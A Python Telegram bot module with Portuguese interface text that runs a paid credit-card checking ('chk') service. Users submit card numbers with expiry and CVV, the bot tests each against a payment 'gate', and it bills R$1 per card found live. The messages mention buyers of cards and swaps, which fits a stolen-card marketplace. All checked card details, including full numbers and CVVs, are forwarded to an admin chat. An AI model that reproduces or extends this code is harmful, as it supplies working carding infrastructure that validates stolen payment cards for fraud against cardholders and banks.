import os
import re

from pyrogram import Client, filters
from pyrogram.types import CallbackQuery
from pyromod.helpers import ikb, force_reply

from config import admin_chat
from database import User
from utils import atem_check_full, strip_float


@Client.on_callback_query(filters.regex(r"cc_chk"))
async def on_chk_cq(c: Client, cq: CallbackQuery):
    lang = cq._lang

    user_db = await User.get(id=cq.from_user.id)
    balance = strip_float(user_db.balance)

    keyb = ikb([[("✅ Continuar", "chk_continue")], [("<<", "start")]])

    await cq.edit(
        "🔎 <b>chk de InfoCCs</b>\n- <i>Neste modo você pode verificar CCs em nossa gate e só pagar caso a CC aprove na "
        "mesma. O custo de cada CC aprovada é <b>R$1</b> de saldo.</i>\n<b>Obs: Passando a cc aqui não quer dizer que "
        "ela está na garantia para quem COMPROU, TROCAS DE CCS SOMENTE EM TROCAS.</b>\n\n<b>E AQUI NÃO É LUGAR PARA "
        "TESTAR CC GERADA. NÃO INSISTA.</b> "
        + lang.wallet_info(balance=balance, user_id=cq.from_user.id),
        reply_markup=keyb,
    )


@Client.on_callback_query(filters.regex(r"chk_continue"))
async def on_chk(c: Client, m: CallbackQuery):
    lang = m._lang
    keyb = ikb([[("<<", "start")]])

    user_db = await User.get(id=m.from_user.id)
    balance = strip_float(user_db.balance)

    if balance < 1.0:
        await m.answer(
            "❗️ Você precisa ter ao menos R$1 de saldo para usar esta função.",
            show_alert=True,
        )
        return

    msg = await m.message.chat.ask(
        "Por favor envie as CCs que você deseja que sejam checadas (uma por linha) ou envie /cancel para cancelar.",
        reply_markup=force_reply(),
        timeout=300,
    )
    if msg.text == "/cancel":
        await m.message.reply_text("Cancelado.", reply_markup=keyb)
        return
    cards = re.findall(
        r"(?P<number>\d{16})\W+(?P<month>\d{1,2})\W+(?P<year>\d{2,4})\W+(?P<cvv>\d+)",
        msg.text,
    )
    if not cards:
        await m.message.reply_text(lang.could_not_find_ccs, reply_markup=keyb)
        return

    await m.message.reply_text("🔎 Iniciando chk, aguarde.")

    card_str = []

    approved = 0
    for i, card in enumerate(cards):
        card = "|".join(card)
        await m.message.reply_chat_action("typing")

        user_db = await User.get(id=m.from_user.id)
        balance = strip_float(user_db.balance)

        if balance < 1.0:
            await msg.reply(
                "❗️ Não há saldo suficiente para continuar a operação, por favor adicione mais saldo no menu principal.",
                reply_markup=keyb,
            )
            break

        is_live, card_repr, gate = await atem_check_full(card)
        if is_live is None:
            status = f"❔ Desconhecido (CC não verificada)"
        elif is_live is True:
            user_db = await User.get(id=m.from_user.id)
            balance = strip_float(user_db.balance - 1)
            await user_db.update(balance=balance)
            approved += 1
            status = f"✅ Aprovado"
        elif is_live is False:
            status = f"❗️ Reprovado"
        else:
            continue
        card_str.append(f"{card_repr}|GATE_{gate}|{status}")
        await msg.reply(
            f"[{i + 1}/{len(cards)}] Cartão: <code>{card_repr}</code>\n\nStatus: {status}\n\n"
            + f"Gate: GATE_{gate}",
            quote=True,
        )

    user_db = await User.get(id=m.from_user.id)
    balance = strip_float(user_db.balance)
    await msg.reply(
        f"✅ {approved} cartões de {len(cards)} aprovados. Seu novo saldo: R${balance}.",
        reply_markup=keyb,
    )

    user = m.from_user
    mention = (
        f"@{user.username}"
        if user.username
        else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
    )

    as_file = len(card_str) > 15

    cards2 = "\n".join(card_str) if not as_file else ""

    text = f"""
🔎 {mention} (<code>{user.id}</code>) usou o chk e {approved} de {len(cards)} CCs foram aprovadas.

- Preço: <b>R${approved}</b>
- Novo saldo: <b>R${balance}</b>

- CCs verificadas:
<code>{cards2}</code>"""

    await c.send_message(admin_chat, text)

    if as_file:
        filename = "chk_" + str(m.from_user.id) + ".txt"
        with open(filename, "w") as f:
            f.write("\n".join(card_str))
        await c.send_document(admin_chat, filename)
        os.remove(filename)
